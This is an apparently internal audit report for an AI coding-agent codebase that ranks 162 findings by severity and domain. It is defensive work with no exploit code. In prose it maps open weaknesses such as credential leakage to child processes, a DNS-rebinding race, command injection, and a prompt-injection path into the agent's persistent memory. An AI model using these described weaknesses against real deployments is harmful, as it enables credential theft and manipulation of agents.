# Audit Report — audit-phases-p0-p3-2026-10

Generated 2026-10-04. Synthesized from 8 shard finding files. 165 raw findings → 162 consolidated (3 merged duplicate facets): **0 CRITICAL, 6 HIGH, 70 MEDIUM, 86 LOW**.

## Top 10 highest-leverage fixes
1. [HIGH] security — sdk/src/serve/serve.ts:76 — SEC-7 containment unwired: forward projectRoot/allowedAdditionalDirectories through both serve transports, fail loudly when omitted
2. [HIGH] security — common/src/mcp/dns-pinning.ts:271 — non-Bun https path skips pinning (DNS-rebinding TOCTOU): fail closed or share one DNS resolution between validation and dial
3. [HIGH] correctness — sdk/src/services/semgrep-baseline.ts:158 — SIGKILL escalation armed at spawn kills healthy scans >5s: arm escalate inside the deadline callback (pattern exists in diagnostic-delta-runner.ts)
4. [HIGH] performance — sdk/src/tools/transaction-intent-log.ts:625 — O(n²) whole-file read-rewrite+fsync per append: append-only writes; keep read-rewrite only for bounded trim
5. [HIGH] performance — packages/agent-runtime/src/util/run-journal.ts:500 — per-append full-table retention scan (512 MiB cap): maintain a running per-run byte total instead
6. [HIGH] security — sdk/src/env.ts:72 — child-env credential scrub is a fixed 8-key denylist: derive strip set from configured provider apiKeyEnv presets + regression test (consolidates env.ts:60 contract facet and env.test.ts:210 echo-test facet)
7. [MEDIUM] security — sdk/src/serve/event-bridge.ts:500 — tool_call rawInput bypasses NEW-3 credential holdback: apply credential-value substitution over rawInput
8. [MEDIUM] security — agents/context-pruner.ts:1900 — pinned active-work extraction runs on raw model text: sanitize before extraction (durable prompt-injection channel)
9. [MEDIUM] security — scripts/memory-drift-guard.ts:700 — unsigned review-receipt forgeable to suppress staleness findings: bind receipt to reviewer run
10. [MEDIUM] correctness — sdk/src/services/semgrep-baseline.ts:412 — exit-1-with-findings treated as failure: parse SARIF, return ok for findings-found code

## Cross-cutting findings (span multiple shards)

- **Cache/registry unboundedness / bounds enforced at read not write** (p1-acp-serve, p0-safety, p2-durability, pr-cq-compaction, indexer-codemap): ACP sessions Map capped at 16 but never evicted → permanent DoS (acp-agent.ts:620); `runningClients`/`listToolsCache` unbounded + poisoned rejected promise (mcp/client.ts:640,700); per-session bridge maps never deleted (bridge.ts:155); `pipeProbeCache` never evicted, deferred user-data-dir cleanups unswept (browser-logs.ts:950); `parsedCacheByRoot.set` bypasses `evictOldestRootCacheIfNeeded` on write paths (metadata-indexer.ts:113); `inFlightDetections` uncapped/undeadline (scip-runner.ts:660); oversize tmp artifacts accumulate forever with default perms (spawn-agent-utils.ts:1505); `refs/openbuff/turns` grows against git gc forever (turn-snapshots.ts:40).
- **Fail-open error swallowing** (p0-safety, p1-acp-serve, p2-durability, pr-cq-compaction, indexer-codemap): `chromeSandboxArgs` fails open to `--no-sandbox` (browser-logs.ts:674); memory-drift-guard `checkStaleness` returns zero findings on any git failure — gate fails open (memory-drift-guard.ts:470); socket 'error' swallowed, close() unlinks a rebound socket (socket-listener.ts:197); watcher-worker crash degrades silently (index-dir-watch.ts:175); SCIP worker-load failure silently degrades every ingest to main-thread 256MiB parse (scip-runner.ts:850); metadata cache-write / hash-read failures swallowed (3d-assets.ts:930, metadata-indexer.ts:262); CDP writeFrame rejections discarded (cdp-pipe-transport.ts:233); turn finally-flush can mask the run error (bridge.ts:660).
- **Spawn-time vs deadline-timer arming / missing hard deadlines** (p3-language, p2-durability, indexer-codemap): semgrep SIGKILL escalate armed at spawn (semgrep-baseline.ts:158); supervisor settle has no absolute deadline race — unkillable child hangs the supervisor forever (process-supervisor.ts:345); SCIP timeout coverage is seam-only, no process-level test (scip-runner.test.ts:241). The correct in-deadline-callback pattern already exists in diagnostic-delta-runner.ts:129-135 — it is applied inconsistently.
- **Unvalidated bytes trusted at trust boundaries** (p1-acp-serve, pr-cq-compaction, indexer-codemap): journal-restored gate snapshot type-asserted, not schema-validated — tampered journal forges "gate passed" on the wire (session-data.ts:770); forgeable unsigned review receipt (memory-drift-guard.ts:700); workspace-writable 3D metadata concepts ingested with shallow validation (metadata-indexer.ts:661); unbounded SCIP symbol strings persisted as query-facing labels (scip-ingest.ts:350); "last non-empty stdout line wins" weakens the supervised one-line contract (process-supervisor.ts:430). Pattern: sibling record types (capabilities, receipts) get validation; gate snapshots, artifacts, and labels do not.
- **Credential-boundary inconsistency — scrub at one site per path, not a chokepoint** (p0-safety, p1-cli, p1-acp-serve, pr-cq-compaction, p2-durability): fixed denylist (env.ts:72) bypassed by caller-env merge-after-scrub (run-terminal-command.ts:640), by git preflight spawning with full env (run-terminal-command.ts:41), by CLI handing full process.env as credentialEnv via the raw-export helper (serve-command.ts:118 ↔ env.ts:87), by tool_call rawInput skipping NEW-3 holdback (event-bridge.ts:500), by plaintext pre-images persisted to shared state (transaction-intent-log.ts:200), by unsanitized command output in cross-session task memory (context-pruner.ts:2700).
- **Implemented-but-unwired plan features** (p1-cli, p1-acp-serve, p2-durability): OutboundQueue (§12.6 backpressure) is dead code — transports write straight to the writable (outbound.ts:700); DA1 image-capability parser has no production call site (terminal-images.ts:219); replay driver is test-only, production resume seam unwired (run-replay-driver.ts:200). Pattern: component exists and is unit-tested, production seam never connected — plan claims overstate shipped behavior.

## Plan-claim verification

**VERIFIED HOLDING** (LOW-severity caveats noted):
- X-2a hot paths (perf-baseline parity rows) — caveat: baseline script run-state not reentrancy-safe (measure-perf-guards-baseline.ts:160, LOW)
- PageRank iteration/epsilon clamps — caveat: damping clamp admits exactly 1.0 (pagerank.ts:96, LOW)
- SCIP fail-closed ingestion (verified; adjacent MEDIUMs concern label hygiene/runner hygiene, not the fail-closed contract)
- Tokenizer caps + exact-tokenizer seam — caveat: `systemAndToolsTokens` not included in `messagesTokens` (token-counter.ts:520, LOW)
- Frozen capability manifest v1 — caveat: deserialized manifests don't enforce "every language exactly once" (language-capability-manifest.ts:85, LOW)
- NEW-2 trust default fail-closed — caveat: asymmetric realpath canonicalization of allowlist entries (trusted-roots.ts:8, LOW)
- CDP pipe transport fail-closed — caveat: writeFrame rejections swallowed (cdp-pipe-transport.ts:233, LOW)
- Terminal policy fail-closed (verified)
- P0-T6 paired bootstrap CI soundness — caveat: asymmetric percentile indices (statistics.ts:115, LOW)

**NOT FULLY HOLDING:**
- P0-T1 env scrub is denylist-not-allowlist (env.ts:72, HIGH); tests mirror the implementation, verifying only its own echo (env.test.ts:210)
- Caller env merged after the scrub can re-inject stripped credential names (run-terminal-command.ts:640)
- DA1 image capability query not wired to production (terminal-images.ts:219)
- P0-T8 Wilcoxon significance gate: normal approximation at arbitrarily small n, no minimum-sample guard (statistics.ts:180)
- GV-15..GV-30 security golden vectors largely pin fixture-declared expectations, not implemented behavior (acp-ext-v1.golden.test.ts:660)
- Pruner knowledge-memory ceiling unenforceable under many distinct reviewers (context-pruner.ts:1480)
- D26 eviction-archive recall delivers 4k-truncated content vs the full-content claim (context-archive.ts:150)

## De-duplication notes
- No identical finding duplicated across shards at the same file:line; overlap is at pattern level (captured above).
- Merged: env.ts:72 (HIGH) + env.ts:60 (api-contract) + env.test.ts:210 (test-coverage) → one Security HIGH; spawn-agent-utils.ts:1505 security + test-coverage → one entry.
- Correlated pairs kept separate: env.ts:87 raw export ↔ serve-command.ts:118 full-env credentialEnv; zod caret pin (common/package.json:45) ↔ MCP SDK zod-v3 shim (mcp/server.ts:1290); @types-in-runtime-deps (sdk/package.json:30 ↔ common/package.json:18).

## Findings by domain

### Security
- [HIGH] sdk/src/env.ts:72 — 8-key denylist passes other provider credentials (GEMINI_API_KEY, apiKeyEnv values) to children — derive strip set from configured presets; add leak regression test. Consolidates env.ts:60 (document denylist contract on the export) and env.test.ts:210 (suite mirrors implementation's delete list; structurally can't catch a real leak).
- [HIGH] sdk/src/serve/serve.ts:76 — SEC-7 projectRoot omitted in both transports; clients operate outside intended root — add to RunServeOptions, fail loudly when omitted.
- [HIGH] common/src/mcp/dns-pinning.ts:271 — Node/undici https skips pin; check-then-connect TOCTOU — fail closed or cache one DNS resolution across validate+dial.
- [MEDIUM] sdk/src/tools/run-terminal-command.ts:41 — git preflight spawns with full unscrubbed env — pass getChildProcessEnv().
- [MEDIUM] sdk/src/tools/run-terminal-command.ts:640 — caller env merged after scrub re-injects credential names — re-apply denylist after merge.
- [MEDIUM] sdk/src/tools/browser-logs.ts:674 — sandbox probe fails open to --no-sandbox; misses Ubuntu 24.04 AppArmor userns — check apparmor_restrict_unprivileged_userns; fail closed when undeterminable.
- [MEDIUM] sdk/src/services/acp/acp-agent.ts:990 — ext methods serve any sessionId, no per-connection ownership check — validate against per-connection map.
- [MEDIUM] sdk/src/serve/socket-listener.ts:176 — bind→chmod race: socket connectable before 0o600 applied — pre-create with restrictive umask / chmod before accept.
- [MEDIUM] sdk/src/serve/event-bridge.ts:500 — tool_call rawInput bypasses NEW-3 holdback — substitute credential values over rawInput.
- [MEDIUM] sdk/src/mcp/server.ts:915 — MCP read_files echoes live cap.v3 token; issuer runId constant 'mcp' across clients — structured opt-in field or per-client issuer.
- [MEDIUM] cli/src/serve-command.ts:118 — full process env as credentialEnv — pass filtered credential-key allowlist.
- [MEDIUM] cli/src/utils/terminal-notify.ts:20 — OSC 9/777 body/title unsanitized; terminal escape injection — strip control chars.
- [MEDIUM] cli/src/utils/tree-sitter-client.ts:213 — predictable shared /tmp grammar cache; poisonable/symlinkable — per-uid/mkdtemp isolation + ownership check.
- [MEDIUM] cli/src/cli-args.ts:139 — empty --socket selects socket transport with empty path — reject empty values like --socket-token.
- [MEDIUM] sdk/src/tools/transaction-intent-log.ts:200 — plaintext file pre-images (possible secrets) persisted in shared state dir — restrict perms, encrypt or exclude sensitive paths.
- [MEDIUM] sdk/src/services/build-graph.ts:544 — python testCommand interpolates unsanitized directory (command injection) — route through safeCommandToken.
- [MEDIUM] packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:1505 — oversize tmp artifacts unbounded, world-readable, predictable path — 0o600 + TTL sweep + sanitizer. (Consolidates test-coverage: no persistence/round-trip tests.)
- [MEDIUM] agents/context-pruner.ts:1900 — pinned-state extraction on raw model text → durable prompt injection/memory poisoning — sanitize before extraction.
- [MEDIUM] scripts/memory-drift-guard.ts:700 — unsigned local review receipt forgeable, suppresses staleness forever — bind to reviewer run; validate schema at load.
- [MEDIUM] cli/src/utils/payload-sanitizer.ts:60 — 'auth'/'passphrase'/'pwd'/'credentialsJson' not redacted — extend CREDENTIAL_WORDS/CARRIER_SUFFIXES + tests.
- [MEDIUM] packages/indexer/src/metadata-indexer.ts:661 — 3D metadata concepts ingested from workspace-writable file, shallow validation — allowlist charset/length or gate on trust.
- [MEDIUM] packages/indexer/src/scip-ingest.ts:350 — unbounded SCIP symbols persisted as query-facing labels — cap length, truncate/hash.
- [LOW] sdk/src/env.ts:87 — getSystemProcessEnv exports raw env — remove or mark unsafe.
- [LOW] common/src/tools/params/tool/find-files-matching-content.ts:40 — cwd allows absolute out-of-project paths — gate on sandbox tier.
- [LOW] common/src/tools/__tests__/read-files-schema.test.ts:138 — unbounded fragment JSON.parse in preprocessor — cap count/size.
- [LOW] cli/src/utils/trusted-roots.ts:8 — asymmetric realpath canonicalization — canonicalize both sides.
- [LOW] cli/src/serve-command.ts:126 — socket path no lstat/symlink pre-check — validate before bind.
- [LOW] cli/src/utils/turn-snapshots.ts:195 — snapshots capture uncommitted (possibly secret) content, pushable via --mirror — bound retention, limit exposure.
- [LOW] sdk/src/dash/server.ts:455 — token in ?token= URL — header-only default.
- [LOW] agents/context-pruner.ts:2700 — command output persisted verbatim to cross-session memory — sanitize persisted memory.
- [LOW] packages/indexer/src/metadata-indexer.ts:1150 — raw manifest/CI commands as query-facing concepts — cap length, normalize.
- [LOW] packages/indexer/src/scip-runner.ts:712 — PATH-resolved scip-* binaries execute with cwd=projectRoot — document trust model / absolute paths / confirm.
- [LOW] packages/indexer/src/index-store.ts:1010 — lock-pid probe correctly conservative (informational; no fix).

### Correctness
- [HIGH] sdk/src/services/semgrep-baseline.ts:158 — escalate timer armed at spawn kills scans >5s — arm inside deadline callback.
- [MEDIUM] sdk/src/services/semgrep-baseline.ts:412 — exit 1 (findings found) → error, findings dropped — return ok with parsed SARIF.
- [MEDIUM] common/src/tools/compile-tool-definitions.ts:128 — allOf/patternProperties/$defs/prefixItems silently dropped — throw on unrecognized keys.
- [MEDIUM] common/src/tools/compile-tool-definitions.ts:160 — nested additionalProperties:false falsy-checked → Record<string,any> — branch on `=== false`.
- [MEDIUM] sdk/src/services/acp/acp-agent.ts:640 — concurrent prompt() replaces AbortController; first turn uncancellable — reject/abort prior turn.
- [MEDIUM] common/src/mcp/client.ts:640 — listToolsCache caches rejected promise forever — TTL/invalidate + no-op catch.
- [MEDIUM] sdk/src/services/acp/session-data.ts:770 — journal-restored gate snapshot unvalidated — zod-validate, re-derive phase.
- [MEDIUM] evals/buffbench/statistics.ts:180 — Wilcoxon normal approx at any n≥1 — minimum-n guard or exact test.
- [MEDIUM] sdk/src/tools/transaction-intent-log.ts:500 — lock-break unlink race deletes fresh lock → dual writers — identity-verify before unlink.
- [MEDIUM] sdk/src/tools/transaction-intent-log.ts:430 — trim evicts live sibling's unresolved tx_begin — pin unfinished groups.
- [MEDIUM] packages/agent-runtime/src/util/run-journal.ts:870 — batching defers tool_call completion marker past execution → replay double-execution window — force flush before side-effecting tools.
- [MEDIUM] cli/src/utils/turn-snapshots.ts:40 — snapshot ref chain unbounded, gc-immune, --mirror-publishable — retention policy or alternates store.
- [MEDIUM] sdk/src/services/lsp-multiplexer.ts:875 — workspaceSymbol routes to most-recent server regardless of language — language hint or unavailable.
- [MEDIUM] sdk/src/services/harness-intelligence.ts:80 — discoverNamedFiles unbounded recursion (build-graph F3 hardening not mirrored) — port depth/visited caps.
- [MEDIUM] sdk/src/services/diagnostic-delta.ts:241 — strict matcher default rejects shifted pre-existing errors — tolerant/hybrid default on broker path.
- [MEDIUM] packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:2770 — supervised settles collapsed into 'crashed' outcome — structured outcome field.
- [MEDIUM] packages/agent-runtime/src/util/context-archive.ts:150 — eviction archive 4k truncation vs D26 full-content contract; shares 8-snapshot cap with semantic snapshots — raise cap or fix claim + round-trip test.
- [MEDIUM] agents/context-pruner.ts:1480 — ceiling unenforceable with many distinct reviewers — bound excluded fields by total chars.
- [MEDIUM] cli/src/utils/payload-sanitizer.ts:230 — no recursion-depth limit in sanitizeValue; no caps in sanitizeMediaForUiState — maxDepth + caps.
- [MEDIUM] packages/indexer/src/query-data.ts:80 — cap-truncated candidate union reported as df, skewing IDF — return undefined when cap saturated.
- [LOW] common/package.json:8 — exports default './src*.ts' missing '/' — fix to './src/*.ts'.
- [LOW] common/src/protocol/acp-ext-v1.ts:470 — inconsistent empty-value guards; null crashes wire schema — single nonEmptyString helper.
- [LOW] sdk/src/tools/3d-assets.ts:290 — stdout+stderr merged; marker corruption/UTF-8 splits — separate buffers.
- [LOW] sdk/src/tools/3d-assets.ts:340 — OPENBUFF_3D_OPERATIONS unbounded (E2BIG) — cap or pass via file.
- [LOW] evals/buffbench/statistics.ts:115 — asymmetric bootstrap percentile indices — paired indices pinned in test.
- [LOW] sdk/src/tools/cdp-pipe-transport.ts:233 — writeFrame rejections swallowed — reject pending entry.
- [LOW] sdk/src/services/acp/acp-agent.ts:1100 — NdJSON line-byte guard conflates chunk/line boundaries — reset per newline.
- [LOW] cli/src/commands/dash-command.ts:165 — existsSync→openJournal TOCTOU lets dash create the db — read-only open flag.
- [LOW] cli/src/cli-args.ts:128 — --stdio ignored when combined with --socket — error or document precedence.
- [LOW] packages/agent-runtime/src/supervision/process-supervisor.ts:430 — last-non-empty-line-wins weakens one-line contract — reject multi-line stdout.
- [LOW] packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:2430 — lastSetOutputError may permanently downgrade recovered child — clear-on-success or attempt-index stamp.
- [LOW] packages/agent-runtime/src/util/context-archive.ts:275 — early-return over-reports snapshotsSearched — report actual index reached.
- [LOW] packages/agent-runtime/src/util/archive-recall-index.ts:150 — one non-tokenizable term disables FTS for whole query — drop only that term; equivalence tests.
- [LOW] packages/agent-runtime/src/util/tool-result-eviction.ts:55 — tombstone detected by prefix; genuine results misclassified — detect full shape.
- [LOW] scripts/memory-drift-guard.ts:705 — receipt shape check lacks schemaVersion/hash pinning — enforce v1 + 64-hex.
- [LOW] sdk/src/services/language-intelligence.ts:124 — toLspPosition line 0 → -1 — clamp ≥0.
- [LOW] sdk/src/services/symbol-enrichment.ts:245 — inlayHint range end one past EOF — length-1.
- [LOW] sdk/src/services/semgrep-baseline.ts:409 — stderr-sniff timeout detection false positives — use structured signal.
- [LOW] sdk/src/services/harness-intelligence.ts:460 — cargo -p uses dir basename; 'unknown run <script>' command — read Cargo.toml; fallback npm/omit.
- [LOW] packages/indexer/src/metadata-indexer.ts:240 — stat→hash race undocumented — re-stat or document.
- [LOW] packages/indexer/src/pagerank.ts:96 — damping clamp admits 1.0 (non-convergence) — clamp (0,1) exclusive.
- [LOW] packages/agent-runtime/src/util/token-counter.ts:520 — systemAndToolsTokens not in messagesTokens — expose totalTokens() or remove field.
- [LOW] packages/code-map/src/import-sites.ts:216 — Go import-block close over-matched — bare-close on own line.
- [LOW] packages/indexer/src/index-manager.ts:995 — mixed-type revision tie arbitrary — document/coerce.

### State mutation
- [MEDIUM] sdk/src/services/acp/acp-agent.ts:620 — sessions Map cap 16, never evicted → permanent DoS — LRU eviction or session/close teardown.
- [MEDIUM] common/src/mcp/client.ts:700 — runningClients unbounded + double-connect race leaks transports — memoize connect promise, bound registry.
- [MEDIUM] sdk/src/mcp/server.ts:1240 — apply_edits no transaction boundary; expectedHash:null = unconditional overwrite — per-edit results; require expectedHash for overwrite.
- [MEDIUM] sdk/src/tools/change-file.ts:600 — AbortSignal not rechecked between per-change commits — recheck per iteration, abort+rollback.
- [MEDIUM] packages/indexer/src/metadata-indexer.ts:113 — parsedCacheByRoot.set bypasses eviction on write paths — route writes through evicting helper.
- [LOW] sdk/src/tools/browser-logs.ts:1502 — pre-session CDP events silently dropped — bounded buffer + replay.
- [LOW] sdk/src/tools/browser-logs.ts:950 — pipeProbeCache never evicted; deferred cleanups only swept on session activity — evict + unref'd timer.
- [LOW] sdk/src/serve/bridge.ts:155 — per-session bridge maps never cleared; per-frame TextEncoder — clear on close; reuse encoder.
- [LOW] cli/src/utils/terminal-images.ts:10 — cachedProtocol no test reset seam — reset seam or injectable store.
- [LOW] cli/src/utils/turn-snapshots.ts:470 — bisection guard/cancel are per-process globals; unsafe across processes — lock file or document.
- [LOW] packages/agent-runtime/src/util/tool-result-eviction.ts:55 — (cross-listed Correctness) tombstone prefix detection.
- [LOW] packages/indexer/src/scip-runner.ts:660 — inFlightDetections leaks on never-settling probe — hard timeout or sweep.
- [LOW] agents/base2/gate-state.ts:200 — reviewedReviewableFingerprint write-only dead field in serialized state — complete removal now.
- [LOW] scripts/measure-perf-guards-baseline.ts:160 — module-scoped run state not reentrancy-safe — per-invocation context object.

### Error handling
- [MEDIUM] sdk/src/serve/bridge.ts:300 — idle-flush fire-and-forget updates unhandled-reject → serve process crash on client hang-up — attach catch.
- [MEDIUM] sdk/src/services/lsp-multiplexer.ts:752 — acquire returns permanently-dead entry after failed restart; 'stopped' forever — cold-start replacement in existing-entry branch.
- [MEDIUM] sdk/src/services/lsp-multiplexer.ts:453 — unparseable frames leave pending requests hanging until 10s timeout — reject pending / fail connection.
- [MEDIUM] sdk/src/services/diagnostic-delta.ts:319 — applyEdit throw leaves edit applied, no rollback; throwing rollback swallows the rejection result — try/catch + guarded rollback.
- [MEDIUM] packages/agent-runtime/src/util/run-journal.ts:970 — close() leaks sqlite handle + timer when drain throws — try/finally.
- [MEDIUM] packages/agent-runtime/src/supervision/process-supervisor.ts:345 — settle has no absolute deadline; unkillable child hangs supervisor — race against hard deadline.
- [MEDIUM] scripts/memory-drift-guard.ts:470 — staleness catch-all returns zero findings on any git failure (fails open) — distinguish degraded vs clean.
- [MEDIUM] packages/indexer/src/metadata-indexer.ts:590 — transient read failure deletes a still-existing file from index — keep-previous like hash-failure path.
- [MEDIUM] cli/src/index.tsx:740 — non-renderer command paths run without top-level error boundary; exit-code contract broken — try/catch + exitCode=1.
- [LOW] sdk/src/serve/socket-listener.ts:197 — late bind errors swallowed; close() unlinks a rebound socket — propagate error; inode-checked unlink.
- [LOW] sdk/src/serve/bridge.ts:660 — finally-flush can mask run error / throw after cancel — best-effort catch.
- [LOW] cli/src/utils/trusted-roots.ts:87 — malformed trusted-roots.json silently degrades to empty allowlist — one stderr diagnostic per cause.
- [LOW] cli/src/commands/run-command.ts:110 — headless run has no default timeout/abort — --timeout or signal wiring.
- [LOW] packages/agent-runtime/src/supervision/supervised-spawn.ts:60 — default seam throws (mkdtemp/writeFile) instead of structured failed receipt — try/catch → failed receipt.
- [LOW] packages/agent-runtime/src/supervision/child-entry.ts:145 — voided Bun.write rejection can crash child mid-envelope — await or catch → exit 1.
- [LOW] cli/src/utils/index-dir-watch.ts:175 — watcher-worker crash swallowed without diagnostics — log error/exit code.
- [LOW] sdk/src/tools/3d-assets.ts:930 — metadata-cache write failures silently swallowed — debug log.
- [LOW] packages/agent-runtime/src/tools/handlers/tool/recall-context.ts:30 — searchConsolidations outside the no-throw guarantee — degrade to empty on throw.
- [LOW] packages/agent-runtime/src/tools/handlers/tool/spawn-agent-inline.ts:330 — dangling 'interrupted' ledger event if spawn_started emission throws — emit before try or track.
- [LOW] packages/indexer/src/scip-runner.ts:850 — worker-load failure silently degrades every ingest to main-thread parse — memoize degradation + surface status.
- [LOW] packages/indexer/src/metadata-indexer.ts:262 — hash-read failure retried silently every refresh — record diagnostic.
- [LOW] sdk/src/services/diagnostic-delta-runner.ts:168 — signal-killed children reported as exitCode 1; whitespace argv split undocumented — thread signal; argv arrays.

### Performance
- [HIGH] sdk/src/tools/transaction-intent-log.ts:625 — whole-file read-rewrite+fsync per append, O(n²) cumulative — append-only writes; bounded trim only.
- [HIGH] packages/agent-runtime/src/util/run-journal.ts:500 — full per-run table scan on every append (512 MiB retention) — running byte total.
- [MEDIUM] packages/agent-runtime/src/util/run-journal.ts:895 — toolResultForInput full-history scan + per-row JSON.parse per dispatch — in-memory/SQL index.
- [MEDIUM] packages/agent-runtime/src/util/run-journal.ts:1010 — classifyRunResume/planChildResume materialize full event list to inspect tail — bounded seq>last lookup.
- [MEDIUM] sdk/src/dash/provider.ts:75 — listRuns hydrates every event of every run per poll — COUNT + MIN(created_at) primitive.
- [MEDIUM] sdk/src/services/harness-intelligence.ts:316 — 14 serial spawnSync probes per inspect, uncached — cache tools record / parallelize / lazy.
- [MEDIUM] packages/agent-runtime/src/util/tool-result-eviction.ts:300 — 2+ full-array tokenizations + per-candidate serializations per step — tokenize once; precompute protected-path blob.
- [MEDIUM] packages/indexer/src/index-store.ts:920 — atomicWriteJson always materializes pretty form before discarding for large docs — size estimate / compact-first.
- [MEDIUM] packages/indexer/src/index-store.ts:68 — loadIndex/readSemanticVectorCache no byte cap (256MiB-class dump hazard) — stat-first cap like chunk sidecar.
- [LOW] packages/agent-runtime/src/process-str-replace.ts:2255 — near-match failure path runs full candidate scan twice — share findClosestMatches result.
- [LOW] packages/agent-runtime/src/process-str-replace.ts:1560 — updateValidatedRangesAfterEdit re-splits whole file per edit event — split once / arithmetic update.
- [LOW] common/src/tools/params/tool/find-files.ts:54 — unbounded fileContents output array — add maxItems.
- [LOW] cli/src/commands/run-command.ts:88 — per-event stdout.write without backpressure; unbounded memory on slow pipe — batch + drain.
- [LOW] scripts/memory-drift-guard.ts:950 — repeated package.json parses + serial per-pathspec git spawns — memoize + batch.
- [LOW] packages/indexer/src/query.ts:470 — scoreFile O(tokens × fields) per candidate, no early exit — persisted normalized token set / short-circuit.

### Dependency hygiene
- [MEDIUM] common/package.json:45 — zod caret-pinned while contract freeze byte-pins z.toJSONSchema output — exact pin for freeze window.
- [LOW] sdk/package.json:30 — @types/ws in production dependencies — move to devDependencies.
- [LOW] common/package.json:18 — @types/pg, @types/readable-stream, @types/seedrandom as runtime deps — move to devDependencies.
- [LOW] packages/agent-runtime/package.json:15 — gpt-tokenizer caret spans load-bearing 2.9.0 semantics — pin ~2.9.0 or add calibration test.
- [LOW] packages/agent-runtime/src/util/archive-recall-index.ts:165 — undeclared runtime dependency on bun:sqlite via @ts-ignore import — declare requirement + non-Bun CI case.
- [LOW] cli/package.json:56 — react-dom in devDependencies while runtime deps suggest runtime import; mixed pin policy — verify/move; lockfile drift check.
- [LOW] common/package.json:25 + packages/indexer/package.json — `ignore` at two majors (5.3.2 vs ^7.0.5) in one bundle — align on one major.

### Test coverage gaps
- [MEDIUM] common/src/protocol/__tests__/acp-ext-v1.golden.test.ts:660 — GV-15..30 pin fixture-declared expectations, not implemented behavior — drive through real serve/bridge paths or annotate.
- [MEDIUM] common/src/tools/__tests__/tool-registration-consistency.test.ts:160 — unrepresentable-schema tool list collected, never asserted — frozen allowlist assertion.
- [MEDIUM] sdk/src/serve/outbound.ts:700 — OutboundQueue (§12.6) dead code; backpressure claim unimplemented — wire or remove/mark as later-wave seam.
- [MEDIUM] cli/src/services/deferred-registries.ts:1 — no tests for deferred-registries semantics or effectiveTrust resolution invariant — add both suites.
- [MEDIUM] packages/agent-runtime/src/util/run-replay-driver.ts:200 — replay driver has no production call site; double-execution safety untested in integration — wire or remove; kill-mid-tool integration test.
- [MEDIUM] packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:1505 — no tests for oversize artifact persistence or eviction→archive round-trip — add both (consolidated with Security entry).
- [MEDIUM] sdk/src/services/semgrep-baseline.ts:143 — no test for exit-1-with-findings or escalate-timer timing — add both.
- [MEDIUM] packages/indexer/src/scip-runner.test.ts:241 — no process-level SIGTERM-ignoring-child test through defaultAsyncScipRunner — add, mirroring perf-baseline CASE 13.
- [LOW] common/src/tools/params/__tests__/x1-golden-vectors.test.ts:240 — no vector for $ref throw branch or additionalProperties:true — add.
- [LOW] sdk/src/__tests__/env.test.ts:210 — suite mirrors implementation denylist (consolidated with Security env.ts:72 entry).
- [LOW] sdk/src/__tests__/cdp-pipe-transport.test.ts:1523 — no writable-error teardown or late-response-after-timeout tests — add.
- [LOW] packages/indexer/src/index-store.test.ts:1 — no oversized/truncated artifact test — add with byte-cap fix.
- [LOW] packages/indexer/src/metadata-indexer.test.ts:88 — keep-previous-on-read-failure and write-path cache eviction untested — add both.

### API/ABI contract breaks
- [MEDIUM] common/src/tools/params/tool/find-files-matching-content.ts:122 — count not int-bounded; flag allowlist prose-only — .int().nonnegative() + structural constraint.
- [LOW] common/src/tools/__tests__/tool-registration-consistency.test.ts:146 — test re-implements schema resolution rule instead of importing shared resolver — import resolveToolParameterSchema.
- [LOW] common/src/protocol/acp-ext-v1.ts:430 — toWireMutation passes error/rollback/errors by reference into .strict() wire schemas — explicit toWireError projection.
- [LOW] sdk/src/mcp/server.ts:950 — createMcpServer return narrowed to {connect,close} (documented); RunServeOptions missing containment options — add projectRoot options (pairs with SEC-7).
- [LOW] sdk/src/mcp/server.ts:1290 — zod-v3 shim double-cast; fragile coupling to MCP SDK's bundled zod — pin compatible major + drift test.
- [LOW] packages/agent-runtime/src/supervision/process-supervisor.ts:240 — memoryLimitMb accepted but never enforced — enforce or document as reserved.
- [LOW] packages/agent-runtime/src/tools/handlers/tool/spawn-agent-utils.ts:2050 — additive shape changes to spawned-output envelopes/eviction result/receipt are ABI-visible — changelog + consumer tolerance test.
- [LOW] packages/indexer/src/index-store.ts:745 — saveChunkSidecar Promise<void>→Promise<boolean> (source-documented) — changelog; named SaveResult type.
- [LOW] packages/indexer/src/scip-ingest.ts:130 — two merge entrypoints, different return shapes — deprecate mergeScipIntoIndex.
- [LOW] common/src/util/language-capability-manifest.ts:85 — deserialized manifests don't enforce "every language exactly once" — z.refine against SUPPORTED_LANGUAGE_IDS.

## Coverage

- shard-x1-contracts.md: 16 findings (subsystems: common-tools-contract-pipeline, params-registry, acp-ext-v1, results-contracts, package-manifest; 10 files)
- shard-p0-safety.md: 19 findings (sdk-env, cdp-transport, terminal-policy/execution, browser-logs, 3d-assets, str-replace, buffbench-statistics; 10 files)
- shard-p1-acp-serve.md: 20 findings (acp-protocol, serve-bridge/transports, mcp-server, mcp-client, dns-pinning; 13 files)
- shard-p1-cli.md: 18 findings (entry-dispatch, serve-command, args, trusted-roots, deferred-registries, tree-sitter, notify, images, headless-run, dash, package-deps; 11 files)
- shard-p2-durability.md: 22 findings (run-journal, replay-driver, supervision, transaction-intent-log, change-file, turn-snapshots, dash, index-watch; 13 files)
- shard-p3-language.md: 18 findings (lsp-multiplexer, language-intelligence, symbol-enrichment, build-graph, diagnostic-delta/-runner, semgrep-baseline, harness-intelligence; 8 files)
- shard-pr-cq-compaction.md: 23 findings (spawn-agent receipts/handoff, context-archive/recall, tool-result-eviction, context-pruner, base2-gate-state, memory-drift-guard, payload-sanitizer, spawn-agent-inline; 10 files)
- shard-indexer-codemap.md: 29 findings (indexer graph/scip/imports/pagerank/store/manager/metadata/query, code-map import-sites, token-counter, capability-manifest, perf-baseline; 17 files)
- Total: 165 findings across 8 shards (162 consolidated after merging 3 duplicate facets).

- Every shard covered its assigned file list fully across all 8 domains (security, correctness, state-mutation, error-handling, performance, dependency-hygiene, test-coverage, api-contract); each shard receipt lists all 8 domains.
- Out of scope (marked by shards): agents-graveyard (dead code), evals/buffbench/logs (run artifacts), docs (doc-only), rust/ (phases not yet implemented), .agents sessions (plan artifacts), browser-logs.ts action handlers (outline-level only due to 3.8k-line size), package.json manifests assessed but no lockfile-level dedupe analysis.
- The machine-checked evaluate_audit_coverage could not validate reconstructed receipts; the matrix above is manually compiled from the shard receipts.

## Needs follow-up
